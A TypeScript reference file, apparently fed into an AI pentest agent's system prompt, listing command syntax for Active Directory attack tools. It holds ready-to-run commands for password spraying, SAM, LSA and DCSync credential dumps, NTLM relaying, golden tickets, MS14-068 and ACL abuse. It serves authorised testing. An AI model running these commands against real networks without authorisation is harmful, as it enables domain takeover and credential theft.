// Verified correct command syntax for common pentest tools.
// This is injected into the AI system prompt as a hard reference
// to prevent the model from hallucinating flags or invocations.
//
// MAINTENANCE: Update examples here when tools change their CLI.
// All {{VAR}} tokens are substituted with real engagement values at prompt-build time.

export type ToolSyntax = {
    name: string;
    binary: string;       // actual binary/command name to invoke
    notes?: string;
    examples: {
        label: string;
        cmd: string;
    }[];
};

export const toolSyntaxList: ToolSyntax[] = [

    // ── RECONNAISSANCE & ENUMERATION ────────────────────────────────────────

    {
        name: 'NetExec',
        binary: 'nxc',
        notes: 'Protocol comes FIRST, then target. NEVER use "netexec -R" — that does not exist. Syntax: nxc <smb|ldap|winrm|mssql|ftp|ssh> <target> [options]',
        examples: [
            { label: 'SMB host discovery (no creds)',    cmd: 'nxc smb 192.168.56.0/24' },
            { label: 'SMB auth + list shares',           cmd: 'nxc smb 192.168.56.0/24 -u {{USERNAME}} -p \'{{PASSWORD}}\' --shares' },
            { label: 'SMB pass-the-hash',                cmd: 'nxc smb 192.168.56.0/24 -u {{USERNAME}} -H {{NTLM_HASH}}' },
            { label: 'SMB enumerate users',              cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --users' },
            { label: 'SMB enumerate groups',             cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --groups' },
            { label: 'SMB enumerate logged-on users',    cmd: 'nxc smb 192.168.56.0/24 -u {{USERNAME}} -p \'{{PASSWORD}}\' --loggedon-users' },
            { label: 'SMB enumerate local admins',       cmd: 'nxc smb 192.168.56.0/24 -u {{USERNAME}} -p \'{{PASSWORD}}\' --local-groups Administrators' },
            { label: 'SMB password spray',               cmd: 'nxc smb {{DC_IP}} -u users.txt -p \'{{PASSWORD}}\' --continue-on-success' },
            { label: 'SMB dump SAM',                     cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --sam' },
            { label: 'SMB dump LSA secrets',             cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --lsa' },
            { label: 'SMB run command (cmd)',            cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -x "whoami /all"' },
            { label: 'SMB run PowerShell',               cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -X "Get-Process"' },
            { label: 'SMB module — lsassy (dump creds)', cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -M lsassy' },
            { label: 'SMB module — spider_plus (files)', cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -M spider_plus' },
            { label: 'SMB module — printnightmare',      cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -M printnightmare' },
            { label: 'SMB module — zerologon check',     cmd: 'nxc smb {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -M zerologon' },
            { label: 'LDAP dump users',                  cmd: 'nxc ldap {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --users' },
            { label: 'LDAP dump password policy',        cmd: 'nxc ldap {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --pass-pol' },
            { label: 'LDAP find ASREPRoastable users',   cmd: 'nxc ldap {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --asreproast asrep.hashes' },
            { label: 'LDAP find Kerberoastable users',   cmd: 'nxc ldap {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --kerberoasting kerb.hashes' },
            { label: 'LDAP BloodHound collect all',      cmd: 'nxc ldap {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --bloodhound -c All' },
            { label: 'LDAP find unconstrained delegation', cmd: 'nxc ldap {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' --trusted-for-delegation' },
            { label: 'WinRM shell',                      cmd: 'nxc winrm {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\'' },
            { label: 'MSSQL auth check',                 cmd: 'nxc mssql {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\'' },
            { label: 'MSSQL execute query',              cmd: 'nxc mssql {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -q "SELECT @@version"' },
            { label: 'MSSQL enable xp_cmdshell',         cmd: 'nxc mssql {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\' -M mssql_priv -o ACTION=privesc' },
            { label: 'SSH auth check',                   cmd: 'nxc ssh 192.168.56.0/24 -u {{USERNAME}} -p \'{{PASSWORD}}\'' },
        ],
    },

    {
        name: 'Nmap',
        binary: 'nmap',
        examples: [
            { label: 'Ping sweep (host discovery)',       cmd: 'nmap -sn 192.168.56.0/24' },
            { label: 'Fast top-1000 scan',               cmd: 'nmap -T4 --open 192.168.56.0/24' },
            { label: 'Service + version + default scripts', cmd: 'nmap -sV -sC -p- --min-rate 5000 192.168.56.10' },
            { label: 'Full TCP port scan',                cmd: 'nmap -p- --min-rate 5000 -oA nmap_full 192.168.56.10' },
            { label: 'UDP top-20',                        cmd: 'nmap -sU --top-ports 20 192.168.56.10' },
            { label: 'SMB vulnerability scan',            cmd: 'nmap -p 445 --script smb-vuln* 192.168.56.10' },
            { label: 'SMB enum (shares, users, sessions)', cmd: 'nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-security-mode 192.168.56.10' },
            { label: 'MS17-010 (EternalBlue) check',     cmd: 'nmap -p 445 --script ms17-010 192.168.56.10' },
            { label: 'LDAP enumeration',                  cmd: 'nmap -p 389,636 --script ldap-rootdse,ldap-search 192.168.56.10' },
            { label: 'Output all formats',               cmd: 'nmap -sV -sC -oA scan_results 192.168.56.10' },
        ],
    },

    {
        name: 'Kerbrute',
        binary: 'kerbrute',
        notes: 'User enumeration and password spraying via Kerberos pre-auth. Faster and stealthier than LDAP spraying.',
        examples: [
            { label: 'Enumerate valid usernames',         cmd: 'kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} users.txt' },
            { label: 'Password spray',                    cmd: 'kerbrute passwordspray -d {{DOMAIN}} --dc {{DC_IP}} users.txt \'{{PASSWORD}}\'' },
            { label: 'Brute-force single user',           cmd: 'kerbrute bruteuser -d {{DOMAIN}} --dc {{DC_IP}} passwords.txt {{USERNAME}}' },
            { label: 'Output valid users to file',        cmd: 'kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} users.txt -o valid_users.txt' },
        ],
    },

    {
        name: 'enum4linux-ng',
        binary: 'enum4linux-ng',
        notes: 'Python rewrite of enum4linux. More reliable, JSON/YAML output. NOT the same syntax as classic enum4linux.',
        examples: [
            { label: 'Full unauthenticated enum',         cmd: 'enum4linux-ng -A {{DC_IP}}' },
            { label: 'Authenticated full enum',           cmd: 'enum4linux-ng -A {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\'' },
            { label: 'Enum users + groups only',          cmd: 'enum4linux-ng -U -G {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\'' },
            { label: 'Output as JSON',                    cmd: 'enum4linux-ng -A {{DC_IP}} -oJ enum_results' },
            { label: 'RID brute-force users',             cmd: 'enum4linux-ng -R {{DC_IP}} -u {{USERNAME}} -p \'{{PASSWORD}}\'' },
        ],
    },

    {
        name: 'ldapsearch / ldapdomaindump',
        binary: 'ldapsearch / ldapdomaindump',
        notes: 'ldapsearch uses LDAP filter syntax. ldapdomaindump is easier and outputs HTML+JSON.',
        examples: [
            { label: 'ldapsearch — all domain users',     cmd: 'ldapsearch -H ldap://{{DC_IP}} -x -D "{{UPN}}" -w \'{{PASSWORD}}\' -b "DC={{DOMAIN_SHORT}},DC=local" "(objectClass=user)" sAMAccountName memberOf' },
            { label: 'ldapsearch — anonymous bind info',  cmd: 'ldapsearch -H ldap://{{DC_IP}} -x -s base namingcontexts' },
            { label: 'ldapsearch — find DA members',      cmd: 'ldapsearch -H ldap://{{DC_IP}} -x -D "{{UPN}}" -w \'{{PASSWORD}}\' -b "DC={{DOMAIN_SHORT}},DC=local" "(&(objectClass=group)(cn=Domain Admins))" member' },
            { label: 'ldapdomaindump — dump all',         cmd: 'ldapdomaindump {{DC_IP}} -u \'{{DOMAIN}}\\{{USERNAME}}\' -p \'{{PASSWORD}}\' -o ./ldap_dump/' },
        ],
    },

    {
        name: 'BloodHound / SharpHound',
        binary: 'SharpHound.exe / bloodhound-python',
        notes: 'Use SharpHound for in-scope Windows collection; bloodhound-python for remote Linux collection.',
        examples: [
            { label: 'SharpHound — all collection',       cmd: 'SharpHound.exe -c All --zipfilename bh_output.zip' },
            { label: 'SharpHound — stealth (no noisy)',   cmd: 'SharpHound.exe -c DCOnly --outputdirectory C:\\Temp\\' },
            { label: 'SharpHound — specific domain',      cmd: 'SharpHound.exe -c All -d {{DOMAIN}} --zipfilename bh_{{DOMAIN}}.zip' },
            { label: 'bloodhound-python — all',           cmd: 'bloodhound-python -u {{USERNAME}} -p \'{{PASSWORD}}\' -d {{DOMAIN}} -dc {{DC_IP}} -c All --zip' },
            { label: 'bloodhound-python — over LDAP',     cmd: 'bloodhound-python -u {{USERNAME}} -p \'{{PASSWORD}}\' -d {{DOMAIN}} -dc {{DC_IP}} -c All --dns-tcp' },
        ],
    },

    {
        name: 'PingCastle',
        binary: 'PingCastle.exe',
        notes: 'Windows binary. Run on domain-joined host for best results. Generates HTML report.',
        examples: [
            { label: 'Full domain health scan',           cmd: 'PingCastle.exe --healthcheck --server {{DC_IP}}' },
            { label: 'Scan with credentials',             cmd: 'PingCastle.exe --healthcheck --server {{DC_IP}} --user {{USERNAME}} --password \'{{PASSWORD}}\'' },
            { label: 'Scan all reachable domains',        cmd: 'PingCastle.exe --healthcheck --server * ' },
            { label: 'Export to XML',                     cmd: 'PingCastle.exe --healthcheck --server {{DC_IP}} --out pingcastle_report' },
        ],
    },

    {
        name: 'ADExplorer',
        binary: 'ADExplorer.exe',
        notes: 'GUI tool. Snapshot feature (File > Create Snapshot) is the key offensive feature — creates an offline AD database.',
        examples: [
            { label: 'Take offline snapshot (CLI)',       cmd: 'ADExplorer.exe -snapshot "" ad_snapshot.dat' },
            { label: 'Connect to DC',                     cmd: 'ADExplorer.exe \\\\{{DC_IP}}' },
        ],
    },

    // ── CREDENTIAL ATTACKS ───────────────────────────────────────────────────

    {
        name: 'Responder',
        binary: 'responder',
        notes: 'Run as root. Edit /etc/responder/Responder.conf: set SMB=Off and HTTP=Off when relaying with ntlmrelayx.',
        examples: [
            { label: 'Capture hashes (poisoning on)',     cmd: 'sudo responder -I eth0 -wv' },
            { label: 'Relay mode (SMB+HTTP off in conf)', cmd: 'sudo responder -I eth0 -wv -F' },
            { label: 'Force WPAD / proxy auth',           cmd: 'sudo responder -I eth0 -wvP' },
            { label: 'View captured hashes',              cmd: 'cat /usr/share/responder/logs/Responder-Session.log' },
        ],
    },

    {
        name: 'Inveigh',
        binary: 'Inveigh.exe / Invoke-Inveigh.ps1',
        notes: 'Windows equivalent of Responder. Run from a domain-joined Windows host. Use Inveigh.exe (C#) or the PowerShell module.',
        examples: [
            { label: 'Start capture (C# binary)',         cmd: 'Inveigh.exe' },
            { label: 'Start with LLMNR + NBNS',           cmd: 'Inveigh.exe -LLMNR Y -NBNS Y -ConsoleOutput Y' },
            { label: 'PowerShell — start',                cmd: 'Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y' },
            { label: 'PowerShell — stop + dump',          cmd: 'Stop-Inveigh; Get-InveighLog' },
            { label: 'Interactive console (C#)',          cmd: '# In Inveigh.exe: press ESC to open console\nGET NTLMV2UNIQUE\nGET NTLMV2USERNAMES' },
        ],
    },

    {
        name: 'Impacket — ntlmrelayx',
        binary: 'ntlmrelayx.py',
        notes: 'Run alongside Responder (with SMB=Off, HTTP=Off in Responder.conf). targets.txt = list of IPs that do NOT have signing required.',
        examples: [
            { label: 'Relay SMB → SAM dump',              cmd: 'ntlmrelayx.py -tf targets.txt -smb2support' },
            { label: 'Relay SMB → interactive SOCKS',     cmd: 'ntlmrelayx.py -tf targets.txt -smb2support -socks' },
            { label: 'Relay HTTP → LDAP (no signing)',     cmd: 'ntlmrelayx.py -t ldap://{{DC_IP}} --no-da --no-acl' },
            { label: 'Relay → create new DA user',        cmd: 'ntlmrelayx.py -t ldap://{{DC_IP}} --add-computer EVILPC$ --escalate-user {{USERNAME}}' },
            { label: 'Relay → ADCS ESC8',                 cmd: 'ntlmrelayx.py -t http://{{DC_IP}}/certsrv/certfnsh.asp --adcs --template DomainController' },
            { label: 'Relay multi-target from file',      cmd: 'ntlmrelayx.py -tf targets.txt -smb2support -w 1' },
        ],
    },

    {
        name: 'Impacket — secretsdump',
        binary: 'secretsdump.py',
        examples: [
            { label: 'DCSync — dump all hashes',          cmd: 'secretsdump.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
            { label: 'DCSync — pass-the-hash',            cmd: 'secretsdump.py {{DOMAIN}}/{{USERNAME}}@{{DC_IP}} -hashes :{{NTLM_HASH}}' },
            { label: 'DCSync — just krbtgt',              cmd: 'secretsdump.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}} -just-dc-user krbtgt' },
            { label: 'Dump remote SAM/LSA',               cmd: 'secretsdump.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.30' },
            { label: 'From local NTDS.dit file',          cmd: 'secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL' },
        ],
    },

    {
        name: 'Impacket — GetUserSPNs (Kerberoast)',
        binary: 'GetUserSPNs.py',
        examples: [
            { label: 'List SPN accounts',                 cmd: 'GetUserSPNs.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
            { label: 'Request TGS hashes',                cmd: 'GetUserSPNs.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}} -request -outputfile kerberoast.hashes' },
            { label: 'PTH variant',                       cmd: 'GetUserSPNs.py {{DOMAIN}}/{{USERNAME}} -hashes :{{NTLM_HASH}} -dc-ip {{DC_IP}} -request -outputfile kerberoast.hashes' },
        ],
    },

    {
        name: 'Impacket — GetNPUsers (AS-REP Roast)',
        binary: 'GetNPUsers.py',
        examples: [
            { label: 'Roast from user list (no creds)',   cmd: 'GetNPUsers.py {{DOMAIN}}/ -no-pass -usersfile users.txt -dc-ip {{DC_IP}} -format hashcat -outputfile asrep.hashes' },
            { label: 'Roast authenticated',               cmd: 'GetNPUsers.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}} -request -format hashcat -outputfile asrep.hashes' },
            { label: 'List all accounts',                 cmd: 'GetNPUsers.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}} -all' },
        ],
    },

    {
        name: 'Impacket — psexec / wmiexec / smbexec / atexec',
        binary: 'psexec.py / wmiexec.py / smbexec.py / atexec.py',
        notes: 'All accept -hashes :NTLM for PTH. wmiexec is stealthiest (no service creation). psexec drops a binary on disk.',
        examples: [
            { label: 'psexec (password)',                 cmd: 'psexec.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20' },
            { label: 'psexec (hash, PTH)',                cmd: 'psexec.py {{DOMAIN}}/{{USERNAME}}@192.168.56.20 -hashes :{{NTLM_HASH}}' },
            { label: 'wmiexec (password)',                cmd: 'wmiexec.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20' },
            { label: 'wmiexec (hash, PTH)',               cmd: 'wmiexec.py {{DOMAIN}}/{{USERNAME}}@192.168.56.20 -hashes :{{NTLM_HASH}}' },
            { label: 'smbexec (hash)',                    cmd: 'smbexec.py {{DOMAIN}}/{{USERNAME}}@192.168.56.20 -hashes :{{NTLM_HASH}}' },
            { label: 'atexec — scheduled task exec',     cmd: 'atexec.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 "whoami"' },
        ],
    },

    {
        name: 'Impacket — smbclient',
        binary: 'smbclient.py',
        examples: [
            { label: 'Browse shares',                     cmd: 'smbclient.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20' },
            { label: 'Browse shares (hash)',              cmd: 'smbclient.py {{DOMAIN}}/{{USERNAME}}@192.168.56.20 -hashes :{{NTLM_HASH}}' },
            { label: 'In smbclient shell — list shares', cmd: 'shares' },
            { label: 'In smbclient shell — use share',   cmd: 'use C$' },
            { label: 'In smbclient shell — get file',    cmd: 'get \\Windows\\System32\\config\\SAM' },
        ],
    },

    {
        name: 'Impacket — lookupsid (RID brute)',
        binary: 'lookupsid.py',
        notes: 'Enumerates users/groups by brute-forcing RIDs. Works with or without credentials.',
        examples: [
            { label: 'RID brute unauthenticated',        cmd: 'lookupsid.py guest@{{DC_IP}} -no-pass' },
            { label: 'RID brute authenticated',          cmd: 'lookupsid.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
            { label: 'RID brute with hash',              cmd: 'lookupsid.py {{DOMAIN}}/{{USERNAME}}@{{DC_IP}} -hashes :{{NTLM_HASH}}' },
        ],
    },

    {
        name: 'Impacket — ticketer (Golden/Silver tickets)',
        binary: 'ticketer.py',
        notes: 'Golden ticket requires krbtgt hash + domain SID. Silver ticket requires service account hash.',
        examples: [
            { label: 'Golden ticket',                     cmd: 'ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain {{DOMAIN}} Administrator' },
            { label: 'Golden ticket + inject',            cmd: 'export KRB5CCNAME=Administrator.ccache\npsexec.py -k -no-pass {{DOMAIN}}/Administrator@{{DC_IP}}' },
            { label: 'Silver ticket (CIFS)',              cmd: 'ticketer.py -nthash <service_hash> -domain-sid <domain_sid> -domain {{DOMAIN}} -spn CIFS/target.{{DOMAIN}} Administrator' },
        ],
    },

    {
        name: 'Impacket — findDelegation',
        binary: 'findDelegation.py',
        examples: [
            { label: 'Find all delegation configs',       cmd: 'findDelegation.py {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
            { label: 'PTH variant',                       cmd: 'findDelegation.py {{DOMAIN}}/{{USERNAME}} -hashes :{{NTLM_HASH}} -dc-ip {{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — addcomputer (RBCD prep)',
        binary: 'addcomputer.py',
        notes: 'Creates a machine account (requires MAQ > 0 by default, or a user with CreateChild on Computers OU).',
        examples: [
            { label: 'Add machine account',              cmd: 'addcomputer.py -computer-name \'ATTACKPC$\' -computer-pass \'Attacker123!\' -dc-host {{DC_IP}} \'{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}\'' },
            { label: 'Add using hash',                   cmd: 'addcomputer.py -computer-name \'ATTACKPC$\' -computer-pass \'Attacker123!\' -dc-host {{DC_IP}} -hashes :{{NTLM_HASH}} \'{{DOMAIN}}/{{USERNAME}}\'' },
        ],
    },

    {
        name: 'Impacket — dacledit (ACL abuse)',
        binary: 'dacledit.py',
        notes: 'Read and write DACLs on AD objects. Useful for GenericAll/GenericWrite/WriteDACL exploitation.',
        examples: [
            { label: 'Read DACLs on target user',         cmd: 'dacledit.py -action read -dc-ip {{DC_IP}} \'{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}\' -target targetuser' },
            { label: 'Grant FullControl to self',         cmd: 'dacledit.py -action write -rights FullControl -principal {{USERNAME}} -target targetuser -dc-ip {{DC_IP}} \'{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}\'' },
            { label: 'Grant DCSync rights',               cmd: 'dacledit.py -action write -rights DCSync -principal {{USERNAME}} -target-dn "DC={{DOMAIN_SHORT}},DC=local" -dc-ip {{DC_IP}} \'{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}\'' },
        ],
    },

    // ── IMPACKET — TICKET & KERBEROS UTILS ───────────────────────────────────

    {
        name: 'Impacket — getTGT',
        binary: 'impacket-getTGT / getTGT.py',
        notes: 'Request a TGT and save to <user>.ccache. Set KRB5CCNAME=<user>.ccache, then use -k -no-pass with other Impacket tools.',
        examples: [
            { label: 'Request TGT (password)',           cmd: 'impacket-getTGT {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'' },
            { label: 'Request TGT (hash)',               cmd: 'impacket-getTGT {{DOMAIN}}/{{USERNAME}} -hashes :{{NTLM_HASH}}' },
            { label: 'Use TGT with psexec',              cmd: 'export KRB5CCNAME={{USERNAME}}.ccache\nimpacket-psexec -k -no-pass {{DOMAIN}}/{{USERNAME}}@{{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — getST (S4U delegation)',
        binary: 'impacket-getST / getST.py',
        notes: 'Get a service ticket via S4U2Self+S4U2Proxy. Core tool for RBCD and constrained delegation exploitation. Run AFTER addcomputer + rbcd.',
        examples: [
            { label: 'RBCD — impersonate DA for cifs',   cmd: 'impacket-getST -spn cifs/TARGET.{{DOMAIN}} -impersonate Administrator -dc-ip {{DC_IP}} \'{{DOMAIN}}/ATTACKPC$:Attacker123!\'' },
            { label: 'Use the ST',                       cmd: 'export KRB5CCNAME=\'Administrator@cifs_TARGET.{{DOMAIN}}@{{DOMAIN}}.ccache\'\nimpacket-psexec -k -no-pass {{DOMAIN}}/Administrator@TARGET.{{DOMAIN}}' },
            { label: 'Constrained deleg abuse',          cmd: 'impacket-getST -spn cifs/TARGET.{{DOMAIN}} -impersonate Administrator -dc-ip {{DC_IP}} \'{{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}\'' },
        ],
    },

    {
        name: 'Impacket — describeTicket',
        binary: 'impacket-describeTicket / describeTicket.py',
        notes: 'Parse and display the contents of a Kerberos ticket. Reveals user, SPN, PAC, flags, and expiry.',
        examples: [
            { label: 'Describe .ccache ticket',          cmd: 'impacket-describeTicket ticket.ccache' },
            { label: 'Describe .kirbi ticket',           cmd: 'impacket-describeTicket ticket.kirbi' },
        ],
    },

    {
        name: 'Impacket — ticketConverter',
        binary: 'impacket-ticketConverter / ticketConverter.py',
        notes: 'Convert between .ccache (Linux) and .kirbi (Windows) Kerberos ticket formats.',
        examples: [
            { label: '.kirbi → .ccache',                 cmd: 'impacket-ticketConverter ticket.kirbi ticket.ccache' },
            { label: '.ccache → .kirbi',                 cmd: 'impacket-ticketConverter ticket.ccache ticket.kirbi' },
        ],
    },

    {
        name: 'Impacket — getPac',
        binary: 'impacket-getPac / getPac.py',
        notes: 'Retrieve and display the PAC (Privilege Attribute Certificate) embedded in a Kerberos ticket — shows group memberships.',
        examples: [
            { label: 'Get PAC for target user',          cmd: 'impacket-getPac -targetUser krbtgt {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — goldenPac (MS14-068)',
        binary: 'impacket-goldenPac / goldenPac.py',
        notes: 'Exploits MS14-068 (Kerberos PAC validation flaw) to forge a DA-privileged TGT on unpatched DCs.',
        examples: [
            { label: 'Exploit MS14-068, spawn shell',    cmd: 'impacket-goldenPac {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — keylistattack (RODC)',
        binary: 'impacket-keylistattack / keylistattack.py',
        notes: 'Retrieves cached hashes from a Read-Only DC using the Kerberos Key List request. Requires the RODC krbtgt key.',
        examples: [
            { label: 'Dump from RODC',                   cmd: 'impacket-keylistattack -rodcNo <rodc_account_id> -rodcKey <rodc_krbtgt_ntlm> -dc-ip {{DC_IP}} {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'' },
        ],
    },

    {
        name: 'Impacket — raiseChild (child→parent escalation)',
        binary: 'impacket-raiseChild / raiseChild.py',
        notes: 'Escalates from child domain Admin → parent forest root Admin via SID history / inter-realm golden ticket.',
        examples: [
            { label: 'Escalate child → parent',          cmd: 'impacket-raiseChild -target-exec {{DC_IP}} {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'' },
        ],
    },

    // ── IMPACKET — AD ENUMERATION ─────────────────────────────────────────────

    {
        name: 'Impacket — GetADUsers',
        binary: 'impacket-GetADUsers / GetADUsers.py',
        examples: [
            { label: 'Enumerate all users',              cmd: 'impacket-GetADUsers -all {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
            { label: 'PTH variant',                      cmd: 'impacket-GetADUsers -all {{DOMAIN}}/{{USERNAME}} -hashes :{{NTLM_HASH}} -dc-ip {{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — GetADComputers',
        binary: 'impacket-GetADComputers / GetADComputers.py',
        examples: [
            { label: 'Enumerate all computers',          cmd: 'impacket-GetADComputers -all {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — GetLAPSPassword',
        binary: 'impacket-GetLAPSPassword / GetLAPSPassword.py',
        notes: 'Read LAPS passwords from ms-MCS-AdmPwd. Requires read access to that attribute on target computer objects.',
        examples: [
            { label: 'Dump all LAPS passwords',          cmd: 'impacket-GetLAPSPassword {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}}' },
            { label: 'Specific computer',                cmd: 'impacket-GetLAPSPassword {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -dc-ip {{DC_IP}} -computer SRV01$' },
        ],
    },

    {
        name: 'Impacket — Get-GPPPassword',
        binary: 'impacket-Get-GPPPassword / Get-GPPPassword.py',
        notes: 'Retrieves plaintext credentials from GPP XML files in SYSVOL (Groups.xml etc). Classic MS14-025 finding.',
        examples: [
            { label: 'Dump GPP credentials from SYSVOL', cmd: 'impacket-Get-GPPPassword {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — DumpNTLMInfo',
        binary: 'impacket-DumpNTLMInfo / DumpNTLMInfo.py',
        notes: 'Retrieve OS and domain info via NTLM challenge over SMB — no credentials required.',
        examples: [
            { label: 'Single target',                    cmd: 'impacket-DumpNTLMInfo {{DC_IP}}' },
            { label: 'Subnet scan',                      cmd: 'impacket-DumpNTLMInfo 192.168.56.0/24' },
        ],
    },

    {
        name: 'Impacket — samrdump',
        binary: 'impacket-samrdump / samrdump.py',
        notes: 'Enumerate users, aliases, and shares via SAMR protocol. Try unauthenticated first (null sessions).',
        examples: [
            { label: 'Authenticated dump',               cmd: 'impacket-samrdump {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
            { label: 'Try null session',                 cmd: 'impacket-samrdump {{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — net',
        binary: 'impacket-net / net.py',
        notes: 'Remote net-style RPC commands. Actions: user, group, computer, localgroup, share.',
        examples: [
            { label: 'List domain users',                cmd: 'impacket-net {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}} user' },
            { label: 'List groups',                      cmd: 'impacket-net {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}} group' },
            { label: 'Members of local Admins',          cmd: 'impacket-net {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 localgroup Administrators' },
            { label: 'List shares',                      cmd: 'impacket-net {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20 share' },
        ],
    },

    {
        name: 'Impacket — netview',
        binary: 'impacket-netview / netview.py',
        notes: 'Enumerate active sessions and logged-on users across hosts.',
        examples: [
            { label: 'Enum sessions on target',          cmd: 'impacket-netview {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -target 192.168.56.20' },
            { label: 'Enum sessions on subnet',          cmd: 'impacket-netview {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\' -target 192.168.56.0/24' },
        ],
    },

    {
        name: 'Impacket — rpcdump',
        binary: 'impacket-rpcdump / rpcdump.py',
        notes: 'Enumerate RPC endpoints to find attack surfaces: PrintSpooler (Printer Bug coerce), EFS (PetitPotam), DCOM, etc.',
        examples: [
            { label: 'Dump all endpoints',               cmd: 'impacket-rpcdump {{DC_IP}}' },
            { label: 'Check for PrintSpooler (coerce)',  cmd: 'impacket-rpcdump {{DC_IP}} | grep -i "spoolss\\|print"' },
            { label: 'Check for EFS (PetitPotam)',       cmd: 'impacket-rpcdump {{DC_IP}} | grep -i "efsr\\|efs"' },
            { label: 'Authenticated',                    cmd: 'impacket-rpcdump {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@{{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — rpcmap',
        binary: 'impacket-rpcmap / rpcmap.py',
        notes: 'Map MSRPC interface UUIDs and bindings in detail.',
        examples: [
            { label: 'Map TCP endpoints',                cmd: 'impacket-rpcmap ncacn_ip_tcp:{{DC_IP}}' },
            { label: 'Map SMB named pipe endpoints',     cmd: 'impacket-rpcmap ncacn_np:{{DC_IP}}' },
        ],
    },

    {
        name: 'Impacket — rdp_check',
        binary: 'impacket-rdp_check / rdp_check.py',
        notes: 'Validate RDP credentials (CredSSP/NLA) without opening a full GUI session.',
        examples: [
            { label: 'Check credentials',                cmd: 'impacket-rdp_check {{DOMAIN}}/{{USERNAME}}:\'{{PASSWORD}}\'@192.168.56.20' },
            { label: 'Check with hash (PTH)',             cmd: 'impacket-rdp_check {{DOMAIN}}/{{USERNAME}}@192.168.56.20 -hashes :{{NTLM_HASH}}' },
        ],
    },

    {
